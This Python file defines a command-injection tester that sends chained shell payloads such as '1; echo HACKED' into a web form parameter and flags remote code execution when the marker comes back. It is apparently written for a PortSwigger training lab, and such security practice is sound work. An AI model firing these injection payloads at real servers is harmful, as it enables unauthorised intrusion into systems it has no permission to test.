from .core import WebSession

class CommandInjector:
    def __init__(self, url):
        self.url = url
        self.web = WebSession()

    def run_simple_injection(self, param_name):
        """
        Attempts to inject OS commands using the ECHO technique.
        If we can make the server print a specific string, we have RCE.
        """
        # Payload Strategy:
        # We try to chain the 'echo' command.
        # If the server is vulnerable, it will execute 'echo HACKED' 
        # and the word 'HACKED' will appear in the HTTP response.
        payloads = [
            "1; echo HACKED",
            "1| echo HACKED",
            "1 & echo HACKED",
            "1 || echo HACKED"
        ]
        
        print(f"[*] Target: {self.url}")
        print(f"[*] Vulnerable Parameter: {param_name}")
        
        for payload in payloads:
            print(f"[*] Testing payload: {payload}")
            
            # Data structure for PortSwigger Lab
            data = {
                'productId': '1',      # Required by business logic
                param_name: payload    # Injection point
            }
            
            response = self.web.post(self.url, data=data)
            
            if response is None:
                continue
            
            # DEBUGGING: Print a snippet of the response to understand what's happening
            # This is crucial during development to see errors or unexpected output
            # print(f"[DEBUG] Response Snippet: {response.text[:100]}") 

            # Analysis:
            # We simply look for our magic string "HACKED"
            if "HACKED" in response.text:
                print(f"[+] VULNERABILITY CONFIRMED! Payload: {payload}")
                # Clean up the output to show just the proof (optional, depends on lab output)
                print(f"[+] Proof: The server executed our echo command.")
                return True

        print("[-] No command injection detected with standard payloads.")
        return False
